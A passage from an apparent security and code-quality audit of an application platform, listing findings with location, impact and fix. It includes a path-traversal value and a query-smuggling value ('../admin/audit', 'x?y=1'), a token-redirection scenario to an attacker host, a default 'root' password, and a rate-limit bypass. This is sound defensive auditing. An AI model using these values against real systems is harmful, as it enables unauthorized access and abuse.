**What:** The MIME allowlist includes bare application/zip, and .docx/.xlsx/.pptx map to {ooxml-mime}|_OOXML_ZIP because older libmagic sniffs OOXML as application/zip. validate_upload therefore accepts ANY zip whose claimed extension is .docx/.xlsx/.pptx — the content check degrades to 'is a zip', not 'is an OOXML document'. No structural zip verification.

**Impact:** An applicant/committee member can upload an arbitrary zip disguised as a Word/Excel/PowerPoint file. Bounded: async ClamAV gates delivery and downloads carry Content-Disposition: attachment + nosniff, so no inline execution/XSS. Residual risk is social-engineering / document-store abuse.

**Fix:** After sniffing application/zip for an OOXML extension, open with zipfile and require an OOXML signature ([Content_Types].xml + word/|xl/|ppt/ top-level dir), rejecting otherwise. Or drop application/zip from the allowlist if relying on a libmagic that reports the concrete OOXML mime.

#### AUD-022 — Tool id/path arguments are interpolated raw into MCP request paths; '/' and '../' not encoded

`low` · `security` · area: **mcp**

**Location:** mcp/antragsplattform_mcp/client.py:40-51 (ApiClient.request); raw f-string paths in server.py

**What:** Every MCP tool builds the request path via f-strings embedding caller-supplied ids and passes it to httpx without quoting. httpx does not percent-encode '/' in a segment nor reject '../'; verified that vote_id='../admin/audit' rewrites the URL and 'x?y=1' injects a query string.

**Impact:** Bounded: the agent is the trust principal choosing tool args, the request still carries the same bearer token and is RBAC-authorized server-side, and the HTTP method is fixed per tool (GET stays GET). Residual risk is request confusion / reaching unintended same-method endpoints within the user's authority and query-string smuggling — defense-in-depth, not escalation.

**Fix:** Centralize encoding in ApiClient: urllib.parse.quote(value, safe='') on interpolated ids, or validate ids at the client boundary (re.fullmatch(r'[A-Za-z0-9_-]+') for UUIDs, quote(safe='') for free-form keys).

#### AUD-023 — OAuth token_endpoint/authorization_endpoint from discovery used without re-validating scheme/host

`low` · `security` · area: **mcp**

**Location:** mcp/antragsplattform_mcp/auth.py:130 (authorization_endpoint), 160/192 (token_endpoint→_exchange), 174 (POST); _require_secure_base only at :69

**What:** _require_secure_base is applied only to config.base_url. The discovery document's authorization_endpoint and token_endpoint are then used verbatim (browser redirect; code+verifier and refresh_token POST) with no re-check that they are https or same-origin as base_url.

**Impact:** If the discovery JSON is attacker-influenced (compromised origin/proxy or untrusted upstream mirror), token_endpoint could point to http://attacker/ and the auth code+verifier+tokens would be sent there, enabling account takeover. Conditional on controlling the discovery body (fetched over the https-validated base), so defense-in-depth.

**Fix:** After discovery, run _require_secure_base on both endpoints and assert each shares the host of config.base_url (the same-origin check is the higher-value part). Optionally verify issuer per RFC 8414.

#### AUD-024 — Token-cache directory mode not enforced when the directory already exists

`low` · `security` · area: **mcp**

**Location:** mcp/antragsplattform_mcp/config.py:63

**What:** The token cache dir is created with mkdir(exist_ok=True, mode=0o700); per POSIX, mode applies only on creation and is umask-masked. If ~/.config/antragsplattform-mcp (or an ancestor) already exists with broader permissions, 0o700 is silently not enforced. (Token files themselves are correctly 0o600 via os.open+os.replace.)

**Impact:** Low: token contents stay 0o600, but a world-listable directory leaks the per-URL hash filenames (revealing the user has cached MCP credentials). Single-user boxes unaffected; shared multi-user hosts are the exposure.

**Fix:** After mkdir, os.chmod(root, 0o700) to tighten a pre-existing directory; optionally verify ownership (st_uid == getuid()) and refuse/recreate if owned by another user.

#### AUD-025 — Protocol public (redacted) PDF preserves non-public TOP titles and full attendance roster, mailed to distribution list

`low` · `security` · area: **protocol-pdf / privacy**

**Location:** backend/app/modules/protocol/service.py:507-512 (public branch keeps heading), _header_meta :456-468, finalize :358-364, recipients :675-699

**What:** When a meeting has any non_public agenda item, finalize dual-renders and mails only the public variant, which redacts the body and vote snippets of non-public TOPs but keeps the TOP heading verbatim (block=[f"# {heading}"]) and includes the full present/absent attendance roster + protokollant in the header for both variants. The public PDF is mailed to the union of active gremium members and configured external mail_list distributors.

**Impact:** A non-public TOP title (which can encode the sensitive subject) plus the full attendance roster of a closed session is broadcast to external distributor addresses — leaking metadata the non_public flag is meant to protect. Bounded: recipients are a curated member+distributor list, body/vote tallies are correctly redacted, and the heading-preservation is a documented (numbering) tradeoff; title sensitivity is operator-dependent (convention is neutral titles).

**Fix:** In the public branch emit a neutral heading placeholder for non_public items (preserving numbering), and gate the attendance roster in the public variant behind a flag / abbreviate to counts. Add a test asserting the non_public title string is absent from the public-variant Markdown.

#### AUD-026 — Per-email magic-link rate limit bypassable via address normalization (plus-tags/unicode not folded)

`low` · `security` · area: **shared / antiabuse**

**Location:** backend/app/shared/antiabuse.py:170-178 (rate_limit_magic_link), key at :174, raw read :146-156

**What:** The per-mail key is magic-link:mail:{email.lower()} — only ASCII-lowercasing. The raw body email is not trimmed, plus-stripped, or NFC-normalized. Variants like victim+1@gmail.com that deliver to the same mailbox each count under a distinct ZSET key, defeating the 3/hour-per-mail limit. (The ' victim@x' whitespace variant is not viable — EmailStr rejects it; plus-tags and unicode/IDN-case are the real vectors.)

**Impact:** Mailbox flooding / magic-link spam of a targeted address beyond the intended 3/hour, defeating one of the two anti-abuse dimensions. Bounded by the per-IP cap (needs multiple IPs) and a tag-folding provider; mails are single-use and non-enumerating.

**Fix:** Canonicalize the rate-limit key: lowercase the domain, NFC-normalize, and strip provider plus-tags from the local part (local.split('+',1)[0]) so victim+N@host collapses to one key. (Using the validated EmailStr alone does not fix plus-tags.)

#### AUD-027 — Standalone vote management endpoints have no gremium scope while the sibling read endpoint was scope-hardened

`low` · `security` · area: **xcut-authz / voting**

**Location:** backend/app/modules/voting/router.py:62,67-138 (ManagerDep) vs router.py:173-187 (get_vote→get_scoped); service.py:410-437,460-585

**What:** get_vote was deliberately made fail-closed gremium-scoped via get_scoped→assert_can_read, but the mutating create/open/close/cancel endpoints directly above gate only on the global vote.manage permission and perform NO gremium-scope check; open/close even fire flow transitions that mutate the linked application's status cross-tenant. Gremium-role vote.manage is not in principal.permissions, so only a GLOBAL vote.manage holder can reach these. The asymmetry (scoped read, unscoped state-changing write) is risk-inverted.

**Impact:** A holder of the org-wide vote.manage permission can create/open/close/cancel any application's vote in any gremium with no membership check; closing fires the vote-result flow transition cross-tenant. Bounded because reaching it requires an already-privileged org-wide role, so it is over-broad authority within a privileged permission rather than escalation by a low-priv actor.

**Fix:** Add a gremium-scope check to create/open/close/cancel symmetric to get_scoped (resolve the vote's gremium via eligible_group/meeting and require admin OR gremium-scoped vote.manage), mirroring livevote.can_manage_votes. This also unlocks legitimate per-gremium vote.manage holders currently locked out by the global-only ManagerDep.

#### AUD-028 — Default ALTCHA Sentinel root password 'root' shipped in .env.example and used as compose default

`low` · `security` · area: **xcut-deploy**

**Location:** deploy/.env.example:121 (ALTCHA_ROOT_PASSWORD=root); docker-compose.yml:227; deploy.sh:26-29

**What:** .env.example ships ALTCHA_ROOT_PASSWORD=root as a real value (unlike the other blank secrets), and deploy.sh copies .env.example→.env when absent, so a hurried first deploy runs the ALTCHA admin console with root/root. The console is internal-network only (no host port). (Captcha verification is also inert until ALTCHA_HMAC_SECRET is set, which the placeholder leaves blank.)

**Impact:** On an internal-network foothold (or an operator skipping the rotate note), the captcha admin console is takeover-able with a documented default credential, allowing weakening/disabling of the PoW captcha. Defense-in-depth/hygiene, no internet path.

**Fix:** Change .env.example:121 to ALTCHA_ROOT_PASSWORD= (blank) to force an explicit value, keep the rotate note, and optionally have deploy.sh refuse to start altcha when the password is empty or 'root'.

#### AUD-029 — Gremium-membership overlap invariant has no DB backing — TOCTOU allows two simultaneous active roles

`low` · `correctness` · area: **admin**

**Location:** backend/app/modules/admin/gremium_roles.py:318-343 (create_membership); models.py:104-107 (only two non-unique indexes)

**What:** create_membership enforces 'at most one active role per (principal,gremium)' purely in Python (plain SELECT + intervals_overlap, no lock), with no unique/EXCLUDE constraint backing it. Two concurrent inserts both read the pre-state, both pass, both commit. resolve_principal aggregates ALL time-valid memberships, so the principal then holds the union of both roles' permissions.

**Impact:** Violates the documented invariant; under concurrency (double-submit/two admins racing) a principal can hold two simultaneous active gremium roles and the union of their permissions/vote.cast groups. Admin-only endpoint, benign trigger, no untrusted actor — data-integrity corruption, not escalation an admin couldn't already cause sequentially.

**Fix:** Add a Postgres EXCLUDE constraint (btree_gist) on (principal_id =, gremium_id =, tstzrange(valid_from,valid_until,'[)') &&) with NULLs coalesced to ±infinity; catch the IntegrityError and translate to 409. Keep the Python check as a fast-path only. Requires a new alembic migration.

#### AUD-030 — delete_gremium can raise an unhandled 500 instead of 409 when a cascaded application_type still has applications

`low` · `correctness` · area: **admin**

**Location:** backend/app/modules/admin/service.py:162-170 (delete_gremium); models.py:129-131 (application_type.gremium_id CASCADE); applications/models.py:42 (application.type_id RESTRICT)

**What:** delete_application_type guards in-use deletion with a 409 because application.type_id is RESTRICT. delete_gremium does session.delete+commit with no guard; application_type.gremium_id is CASCADE, so deleting a gremium whose type still has applications trips the RESTRICT FK, raising an uncaught IntegrityError → 500 (still problem+json, but wrong status). The audit row written just before commit rolls back.

**Impact:** An admin.gremien holder gets a 500 instead of 409 and the per-type guard is bypassed via the gremium-delete path. No data loss (RESTRICT blocks it); broken error contract.

**Fix:** In delete_gremium, pre-check for any Application under an application_type of this gremium and raise ConflictError, and/or wrap commit in try/except IntegrityError→ConflictError. The pre-check avoids writing an audit row for a doomed delete.

#### AUD-031 — Self-lockout guard on role assignments not invoked on non-role-id mutations of one's own admin assignment

`low` · `correctness` · area: **admin**

**Location:** backend/app/modules/admin/service.py:610-634 (update_role_assignment); guard at 651-663

**What:** _guard_self_admin_removal runs only when payload.role_id changes; gremium_id/valid_from/valid_until/delegate_voting mutations skip it. Global admin permissions are intentionally gremium-unscoped, so re-scoping via gremium_id is a no-op (the title's 'bypass' framing is inaccurate), but setting valid_until to the past could self-expire admin without the guard.

**Impact:** Currently low/no real impact (admin rights are gremium-unscoped). The genuine issue is guard inconsistency: any non-role-id edit of the actor's own admin assignment skips protection, and valid_until could self-expire admin; future scoping logic could make this a real hole.

**Fix:** Call _guard_self_admin_removal once at the top of update_role_assignment so any mutation of the actor's own admin assignment is blocked, closing the valid_until self-expiry path. Document that global role permissions are deliberately gremium-unscoped.

#### AUD-032 — Detail/timeline/versions/comments expose unconfirmed guest applications hidden from the list

`low` · `correctness` · area: **applications**

**Location:** backend/app/modules/applications/service.py:159-163 (_get_app), get/effective_form/timeline/versions/list_comments; vs list_applications():589 and list_tasks():788

**What:** list_applications and list_tasks filter email_confirmed_at IS NOT NULL so unconfirmed guest submissions stay invisible, but the detail endpoints route through _get_app with no such gate. A principal with application.read/read_all/committee scope who knows an application UUID can read an unconfirmed guest application's data and separated PII before confirmation. (The finding's '12h discard' is not present in code; unconfirmed rows persist.)

**Impact:** Inconsistent visibility model: an intentionally-invisible app is fully readable by id including PII. Low exploitability — requires a privileged internal principal plus an unguessable, never-listed UUID; only consequence is early visibility of self-submitted PII.

**Fix:** Mirror the list semantics on item routes for principal/committee reads while preserving the owning applicant's own magic-link access: in require_app_read 404 a principal-only read when email_confirmed_at IS NULL, or gate _get_app with allow_unconfirmed. Return 404 to avoid an existence oracle.

#### AUD-033 — Committee read-scope detail check is broader than the list query (historical meeting-vote path missing from list)

`low` · `correctness` · area: **applications**

**Location:** backend/app/modules/applications/access.py:143-153 vs service.py:682-732 (_committee_read_clauses)

**What:** The detail check _committee_can_read has three read paths (budget view-scope, current vote-state gremium, historical meeting-vote join) but the list clause builder _committee_read_clauses implements only the first two, omitting the historical-meeting-vote path — though both docstrings assert they MUST mirror.

**Impact:** Not a leak (detail is the more-permissive side). An app a member is allowed to read (voted on in their gremium's meeting) is openable by direct URL but never appears in their GET /applications list — a consistency/UX gap that can drift further.

**Fix:** Add the historical meeting-vote clause to _committee_read_clauses, or factor the three scope predicates into one shared builder consumed by both functions to prevent drift.

#### AUD-034 — Audit list since/until accept naive datetimes compared against timestamptz with no coercion

`low` · `correctness` · area: **audit-config**

**Location:** backend/app/modules/audit/router.py:53-54 (params); service.py:280-283 (query_cursor); models.py:28-30 (at timestamptz)

**What:** since/until are bare datetime query params passed into AuditEntry.at >= since with no tz coercion (no AwareDatetime anywhere). A naive value like ?since=2026-06-01T00:00:00 is valid to Pydantic but on the asyncpg runtime its timestamptz codec rejects naive datetimes, raising DataError that falls through to the catch-all → 500 (problem+json). Admin-gated, so no exposure.

**Impact:** Time-window audit filters 500 (wrong status class; should be 400/422) on syntactically-valid naive input. Violates the tz-aware-datetimes house rule. Part of a cross-cutting naive-datetime theme with the DeadlinePolicy finding.

**Fix:** Type the params as pydantic.AwareDatetime (422 on naive input), or normalize since/until to UTC before query. A shared AwareDatetime base would close this and the DeadlinePolicy variant together.

#### AUD-035 — Expense and transfer amounts lack upper bound, causing numeric-overflow 500 instead of 422

`low` · `correctness` · area: **budget**

**Location:** backend/app/modules/budget/tree_schemas.py:235 (ExpenseCreate.amount), :266 (ExpenseUpdate.amount), :571 (TransferCreate.amount)

**What:** The DB columns are Numeric(12,2) (max 9999999999.99). Invoice fields and AllocationSet.allocated correctly bound via le=_MAX_AMOUNT, but the expense/transfer amount Fields only declare gt=0, allow_inf_nan=False with no le. An amount of 10000000000 passes Pydantic and reaches the INSERT, where Postgres raises a numeric-overflow surfaced as a 500, not the contracted 422.

**Impact:** A budget.book user triggers an unhandled 500 (not 422) on their own request by submitting an over-cap amount. No corruption/cross-tenant effect; an error-contract bug for a critical money module.

**Fix:** Add le=_MAX_AMOUNT to the amount Field on ExpenseCreate, ExpenseUpdate and TransferCreate, matching the invoice-field guards. Add a regression test booking an over-cap amount expecting 422.

#### AUD-036 — update_expense can re-book an expense across top-level budgets, orphaning its fiscal-year reference

`low` · `correctness` · area: **budget**

**Location:** backend/app/modules/budget/tree_service.py:992-998 (update_expense budget_id rebooking)

**What:** PATCH /budget-expenses/{id} allows changing budget_id to any node while keeping fiscal_year_id fixed, but unlike book_expense it does not re-validate that the retained FY belongs to the new target's top-level budget. Rebooking to a cost centre under a different top-level leaves the expense pointing at a foreign FiscalYear. (Verified: it does not silently vanish — it surfaces as an anomalous phantom by_fiscal_year view with allocated=0 and negative available on the new node.)

**Impact:** A budget.book user can move a booking across top-level budgets, producing an orphaned FY reference and a phantom negative-available row — a data-integrity/accounting inconsistency. Requires deliberate cross-top-level rebooking, hence low.

**Fix:** In update_expense, when budget_id changes, re-validate the retained fiscal_year_id against the new target's top-level via _resolve_fiscal_year (raises 422 on mismatch), mirroring book_expense and move_fiscal_year.

#### AUD-037 — Deadline reminders silently lost (and index rows leak) if cron misses a deadline's due window

`low` · `correctness` · area: **calendar-deadlines**

**Location:** backend/app/modules/deadlines/service.py:68-80 (due_reminder_ids), :113-128 (lock_reminder); backend/worker/deadlines.py:138-191

**What:** due_reminder_ids selects reminded_at IS NULL AND due_at > now AND due_at <= now+lead — a two-sided window. If the worker is down longer than the lead (default 24h) or a deadline is created already-past, the row never matches once due_at <= now: the exactly-once reminder is never sent and reminded_at is never stamped, so the row stays in the partial index ix_deadline_reminder and is re-scanned every minute forever.

**Impact:** Recipients miss the deadline_approaching reminder for any deadline whose lead window elapsed during a >lead outage; unremindable rows accumulate in the partial index, growing the per-minute scan set (partly self-limited by CASCADE-delete with applications). No corruption/security impact.

**Fix:** Drop the due_at > now lower bound so passed-but-unreminded deadlines are still selected once and a (late) reminder is sent + stamped, or add a stamp-only sweep UPDATE deadline SET reminded_at=now WHERE reminded_at IS NULL AND due_at <= now to retire elapsed rows from the index.

#### AUD-038 — Apply-wizard draft persists activeIndex but restore never applies it

`low` · `correctness` · area: **fe-quality**

**Location:** frontend/src/app/features/apply/apply-wizard.component.ts:280-321 (persistDraft writes activeIndex :289; restoreDraft never assigns it)

**What:** persistDraft() writes {model, contact, activeIndex} to sessionStorage and restoreDraft() declares activeIndex?:number but only restores model and contact — the saved activeIndex is dead data. The save-progress feature always returns the user to step 0 on reload.

**Impact:** Minor UX regression: restoring a saved draft does not resume at the step the applicant left off. No data loss (model restores).

**Fix:** In restoreDraft(), after model/contact restore, this.activeIndex.set(clamp(draft.activeIndex, 0, steps().length-1)). Sections are built before restoreDraft runs. Or drop activeIndex from the persisted payload if resume-at-step is unwanted.

#### AUD-039 — Budget tree reload fan-out can race and overwrite the selected fiscal year

`low` · `correctness` · area: **fe-quality**

**Location:** frontend/src/app/pages/budget/budget-tree.component.ts:181-214 (reload fan-out), :242-275 (saveColor/toggleState→reload)

**What:** reload() issues one listFiscalYears(top.id) per top-budget with no in-flight/sequence guard (unlike applications-detail's loadSeq). saveColor/toggleState call reload() again, so in-flight responses from a previous reload can resolve after a newer one, overwriting fiscalYears/selectedFyId with stale data. (selectedFyId reset is guarded by a contains-check, so the visible flip is narrower than stated; fiscalYears.set is unconditional.)

**Impact:** On rapid mutations (color/state-toggle then immediate interaction) the fiscal-year list/selection can show stale data; low likelihood and self-correcting on next interaction. Display config only, not integrity/security.

**Fix:** Adopt the loadSeq pattern: capture seq=++this.reloadSeq at the top of reload() and guard every signal mutation with if (seq !== this.reloadSeq) return. Optionally batch the fan-out with forkJoin and set fiscalYearsByBudget once.

#### AUD-040 — delete_attachment does not honor application.edit_any, unlike upload/edit

`low` · `correctness` · area: **files**

**Location:** backend/app/modules/files/router.py:240-249 vs applications/access.py:214-215 (require_app_edit EDIT_ANY short-circuit)

**What:** delete_attachment resolves access via _resolve_with_creator(perm=MANAGE_PERMISSION) and does NOT short-circuit on application.edit_any the way require_app_edit (used for upload) does. A principal with edit_any but not manage can upload attachments to any application but cannot delete them (gets a 404 via the no-oracle mapping).

**Impact:** Inconsistent RBAC: edit_any is a documented global write capability, yet attachment deletion silently excludes it, surfacing as a confusing 404. Fail-closed (denies, not over-grants); limited blast radius since admins usually also hold manage.

**Fix:** Mirror require_app_edit in delete_attachment: short-circuit on EDIT_ANY_PERMISSION before _resolve_with_creator, or factor the delete-authz into a shared dependency so upload and delete share one path. Add a regression test for an edit_any-only principal.

#### AUD-041 — select/multiselect accept non-string option values; type confusion vs FieldOption.value:str

`low` · `correctness` · area: **forms**

**Location:** backend/app/shared/config_schemas.py:138 (FieldOption.value:str); forms/validation.py:380-398

**What:** FieldOption.value is constrained to str, but _validate_select/_validate_multiselect compare the raw applicant value against the option set with no isinstance assertion, so the declared string domain is not strictly enforced before membership. (The numeric 1 vs '1' and True==1 sub-claims are inaccurate; the substantive issue is the missing isinstance guard, which is also the root cause of the unhashable-type 500 covered by the merged forms finding above.)

**Impact:** Minor type-looseness for select answers; primarily relevant as the root cause of the unhashable 500. On its own a clean but type-loose 'not a valid option' result.

**Fix:** Add isinstance(value,str) checks in _validate_select and per-element in _validate_multiselect before membership, enforcing the declared str domain and preventing the unhashable TypeError.

#### AUD-042 — Client-supplied eligibleCount lets a vote manager weaken the quorum denominator with no audit trail

`low` · `correctness` · area: **livevote / voting**

**Location:** backend/app/modules/livevote/router.py:454-462; schemas.py:236; voting/tally.py:97-107; voting/service.py:236-275

**What:** open_meeting_vote takes eligibleCount straight from the request body (only validated ge=0) and uses it as the percent-quorum denominator; the server falls back to the real roster size only when omitted. A canManageVotes holder (session.manage/vote.manage/protokollant) can set it to manufacture or defeat quorum the true roster would not produce. Vote create/open write no audit entry, so the quorum-basis override is not recoverable from the hash chain (it is, however, surfaced in the live tally output).

**Impact:** A trusted-but-not-fully-privileged committee role can manufacture/defeat quorum on live decisions by overriding the eligibility basis, with no audit record of the manipulation. Requires an already-trusted manage role, hence low; weakens the integrity invariant that quorum reflects the real roster.

**Fix:** Drop eligibleCount from MeetingVoteOpenBody and always derive it server-side via vote_eligible_count(meeting.gremium_id). If an override is genuinely needed, clamp it to the computed roster and write an audit_record at open time.

#### AUD-043 — notify-action opt-out filter keys every non-deadline mail to the wrong kind

`low` · `correctness` · area: **notifications**

**Location:** backend/app/modules/notifications/service.py:436 (kind derivation), 441-443 (opt-out filter), 464/483 (footer reason)

**What:** handle_notify_action derives the notification kind from a substring test (reason='deadline' if 'deadline' in templateKey else 'status_update'), then uses it for both the per-user opt-out filter and the footer reason. A flow notify action may carry any templateKey whose true catalogue kind is comment/vote/etc., so the filter always checks status_update and the footer text is wrong.

**Impact:** Per-user opt-out can be silently ineffective for notify actions whose template is not a status update (a user who disabled that real kind still receives the mail), and the footer states an incorrect reason. No PII leak; requires a non-default flow config, hence low.

**Fix:** Replace the substring heuristic with a catalogue lookup: reason = CATALOGUE_BY_KEY.get(templateKey).kind or 'status_update', used for both the opt-out filter and the footer reason.

#### AUD-044 — Concurrent create/upsert of a mail-template key races into a 500 instead of 409

`low` · `correctness` · area: **notifications**

**Location:** backend/app/modules/notifications/service.py:102-115 (create_template), 153-179 (upsert_template)

**What:** create_template/upsert_template do read-then-INSERT on the unique MailTemplate.key with no IntegrityError handling; two concurrent requests for the same new key both pass existing-is-None and the second commit hits the unique constraint, raising an uncaught IntegrityError → 500 instead of the intended 409. (An identical accepted pattern exists at gremium_roles.py:306.)

**Impact:** Admin-only; an occasional 500 under concurrent edits (two admins/double-submit), violating the problem+json error contract for that race.

**Fix:** Wrap the commit in try/except IntegrityError → rollback + ConflictError, mirroring applications/service.py and webhooks/service.py; or use INSERT...ON CONFLICT.

#### AUD-045 — Cron auto-close of expired votes does not broadcast vote_closed to live clients

`low` · `correctness` · area: **voting-delegations**

**Location:** backend/worker/deadlines.py:315-336 (_close_one, voting.close at :328); vs voting/router.py:117-118

**What:** The manual close path calls service.close() then publisher.vote_closed(closed). The cron auto-close path calls voting.close() directly and never publishes vote_closed (VotingService.close does no broadcasting; that lives only in the router). For a time-expired meeting-bound vote, beamer/voter WebSocket clients keep showing it as open until reload, even though the result and flow branch fired server-side.

**Impact:** Live-vote beamer/voter screens display stale 'vote open' state after a timed auto-close; result/branch/notifications fire correctly server-side but the live UI is not refreshed. Confusing during a live meeting; no data-integrity/security impact.

**Fix:** In _close_one, build a BrokerPublisher from the worker's redis pool and emit vote_closed after a successful close (it no-ops for standalone votes), mirroring the router and the open-vote broadcast. Guard publish failures so a broker hiccup doesn't fail the committed close.

#### AUD-046 — Per-minute deadline/vote/auto-transition cron scans are unbounded (no LIMIT)

`low` · `performance` · area: **calendar-deadlines**

**Location:** backend/worker/deadlines.py:197-312, 261-295; deadlines/service.py:56-93 (due_* scans, no LIMIT)

**What:** process_deadlines runs every minute; each step loads the FULL set of due ids (no LIMIT/batch cap) then iterates one DB session per item (action/close/remind/auto-advance). After downtime, a shared absolute-policy rollover across thousands of applications, or a large auto-transition cohort, one tick must drain the entire backlog sequentially. Correctness is preserved (SKIP LOCKED + idempotency markers).

**Impact:** A tick can run far longer than the 1-minute cadence and overlap the next run, holding worker capacity (compounds with the leaked reminder rows). Throughput/latency only, triggered by uncommon large cohorts.

**Fix:** Add a per-tick LIMIT ordered by due_at/closes_at to each scan (and to the auto-transition Application select), e.g. n=200, so the oldest items drain first across ticks; optionally bound per-item concurrency.

#### AUD-047 — No upper bound on positions/offers/table-row counts in the pure engine (relies solely on body cap)

`low` · `performance` · area: **forms**

**Location:** backend/app/modules/forms/validation.py:444-489 (_validate_positions), :415-424 (_validate_table); config_schemas.py:142-153 (no maxPositions/maxOffers)

**What:** _validate_positions enforces minimums and _validate_table honours an optional maxRows, but there is no engine-level ceiling on positions/offers/rows when maxRows is unset. The only backstop is the body cap (default 65536 bytes). extract_promoted/positions_total iterate every position/offer and the whole blob is persisted to JSONB.

**Impact:** Bounded by the body cap (~1000 tiny positions in 64KB → negligible CPU/storage), so not a real DoS today. Becomes unbounded if the body cap is ever raised or an authenticated write path bypasses it.

**Fix:** Add engine-level ceilings independent of the body cap: maxPositions/maxOffers on FieldValidation with sane defaults applied even when unset, and a default maxRows ceiling in _validate_table.

#### AUD-048 — _existing_keys loads every idempotency key for an event across all webhooks on each dispatch

`low` · `performance` · area: **webhooks**

**Location:** backend/app/modules/webhooks/service.py:184-196 (_existing_keys); callers :95, :161

**What:** _existing_keys selects all idempotency_keys for an event (no scoping to candidate keys, no window) and materializes them into a Python set on every dispatch, growing unboundedly with total historical deliveries per event. The DB unique(webhook_id, idempotency_key) + begin_nested savepoint already guarantee correctness, so the pre-check is a poorly-scaling optimization.

**Impact:** Memory and query cost grow linearly with total historical deliveries per event; dispatch latency/memory rise over time. Correctness unaffected.

**Fix:** Scope the query to the concrete candidate keys (WHERE idempotency_key IN (:keys) built from the fetched webhooks), or drop the pre-check and rely on the savepoint + unique constraint.

#### AUD-049 — Critical infra images pinned to :latest (minio, clamav)

`low` · `deps` · area: **xcut-deploy**

**Location:** deploy/docker-compose.yml:161 (minio/minio:latest), :179 (clamav/clamav:latest)

**What:** minio and clamav float on :latest while every other image is version-pinned. MinIO is the object store for all attachments/PDFs and ClamAV is the AV gate; MinIO has shipped breaking API/console/license changes under :latest.

**Impact:** Non-reproducible deploys: a fresh up/pull or deliberate re-pull can silently upgrade these to an incompatible or backdoored release, breaking uploads or the AV scan with no version audit trail. Bounded by internal-only network and no auto pull-policy on a running stack.

**Fix:** Pin both to explicit, periodically-bumped tags (e.g. a dated minio RELEASE and clamav 1.x patch), record versions in deploy notes, optionally set pull_policy: missing.

#### AUD-050 — Security-critical Python deps use bare >= floors with no committed lockfile; non-reproducible images

`low` · `deps` · area: **xcut-deps**

**Location:** backend/pyproject.toml:10-67; mcp/pyproject.toml:7-11; backend/Dockerfile:21-25; ci.yml:183-209

**What:** No Python lockfile exists (no uv.lock/poetry.lock for backend/ or mcp/); every runtime dep including security-critical ones (pyjwt[crypto], cryptography, itsdangerous, httpx, fastapi) is a bare >= floor. The Docker build live-resolves the floors via tomllib (no hashes), and pip-audit in CI live-resolves separately, so the audited tree is not pinned to the shipped tree. Frontend commits package-lock.json (good).

**Impact:** Non-reproducible backend images and an audit/runtime mismatch: a clean CI audit doesn't guarantee the shipped image's tree was audited; a compromised/yanked transitive release can enter a rebuild silently. Standard supply-chain reproducibility gap.

**Fix:** Generate and commit a Python lockfile (uv lock, or pip-tools with --generate-hashes) for backend/ and mcp/, build the image with --require-hashes from the lock, and run pip-audit against the same locked set.

#### AUD-051 — Suppressed but exploit-blocked lxml<6.1 XXE advisory pinned hard by fints

`low` · `deps` · area: **xcut-deps**

**Location:** backend/pyproject.toml:58-66; .github/workflows/ci.yml:209

**What:** fints>=5.0 transitively pins lxml~=6.0.2 (<6.1), so the XXE fix in lxml 6.1.0 (PYSEC-2026-87) cannot be installed and CI permanently --ignore-vulns it. lxml is never imported by app code (the two XML parse sites use stdlib ElementTree, including the only attacker-influenced one, invoice import); lxml sees only authenticated bank TLS responses. No guard enforces 'lxml never sees untrusted input'.

**Impact:** Low today (lxml input is authenticated bank responses). Becomes a real XXE/file-read vector if a future change routes uploaded/applicant XML through lxml while the pin still blocks the fix.

**Fix:** Make the waiver self-expiring: track fints upstream to allow lxml>=6.1 and drop the --ignore-vuln; add a CI grep failing on import lxml/from lxml under backend/app/ while the waiver is active; re-review on every dependency bump.

#### AUD-052 — pytex dependency pin diverges between pyproject (1.0.0) and the deployed requirements.txt (1.0.6)

`low` · `deps` · area: **xcut-deps / pytex**

**Location:** pytex/pyproject.toml:13 (1.0.0) vs pytex/requirements.txt:5 (1.0.6); Dockerfile:49-50 installs requirements.txt

**What:** The pytex render microservice declares pytex-preprocessor==1.0.0 in pyproject.toml but the Docker image installs requirements.txt pinned ==1.0.6. The deployed image is internally consistent at 1.0.6, but local dev / tooling reading pyproject gets 1.0.0 for a security-sensitive Markdown→PDF renderer.

**Impact:** Reproducibility/clarity gap: dev/CI/editor and prod can resolve different renderer versions; a version-specific render-engine fix/regression applies in prod but not local (or vice versa), and audits reading pyproject see the wrong version.

**Fix:** Align pyproject.toml:13 to ==1.0.6 (or generate requirements.txt from pyproject), and add a CI check asserting the two pins match.

#### AUD-053 — Role create/update accept arbitrary permission strings — no validation against PERMISSION_CATALOGUE

`low` · `quality` · area: **admin**

**Location:** backend/app/modules/admin/service.py:521-566 (create_role/update_role); schemas.py:222-231

**What:** RoleCreate/RoleUpdate declare permissions as bare list[str] with no whitelist; create_role/update_role insert them verbatim with no validation against PERMISSION_CATALOGUE (which the module exposes via list_permissions). Unknown/typo'd keys are silently persisted and never match a guard. The sibling gremium-role path validates via _sanitize_perms (asymmetry).

**Impact:** No escalation (fails safe — bogus keys grant nothing; only admin.roles holders can reach these). Silent misconfiguration: typo'd keys grant nothing with no feedback, and role_permission drifts from the documented catalogue, complicating audits.

**Fix:** Add a field_validator on RoleCreate/RoleUpdate rejecting any permission not in PERMISSION_CATALOGUE (422), mirroring _sanitize_perms.

#### AUD-054 — Search-debounce setTimeout timers never cleared on component destroy (list pages)

`low` · `quality` · area: **fe-quality**

**Location:** frontend/src/app/pages/expenses/expenses.component.ts:367-369; invoices.component.ts:157-160; applications-list.component.ts:280-287

**What:** ExpensesComponent, InvoicesComponent and ApplicationsListComponent arm a searchTimer via setTimeout(...,400) for live-search debounce but none implement ngOnDestroy. Navigating away within the 400ms window fires the timer on the destroyed component — an orphaned HTTP GET + .set() on dead signals (expenses/invoices) or a surprise Router navigation (applications-list).

**Impact:** Wasted requests and, for applications-list, a potentially unexpected route change after the user navigated elsewhere. No crash; minor lifecycle leak.

**Fix:** Add ngOnDestroy with clearTimeout(searchTimer), or replace the manual debounce with a Subject piped through debounceTime(400)+takeUntilDestroyed() (applications-list already imports takeUntilDestroyed).

#### AUD-055 — signed_url() returns a non-expiring, unsigned URL while reporting an expiresIn — misleading contract

`low` · `quality` · area: **files**

**Location:** backend/app/modules/files/service.py:181-192 (signed_url); schemas.py:26-31; stale docstrings router.py:5, storage.py:6

**What:** signed_url() returns SignedUrlOut(url='/api/attachments/{id}/download', expiresIn=ttl); the URL has no token/signature/expiry — just the authz-gated download route. expiresIn is cosmetic, contradicting the field name and docstrings ('kurzlebige signierte MinIO-URL'). (The presigned_get_url method is NOT dead — it is used by the PDF module; the auditor's dead-code sub-claim is refuted.)

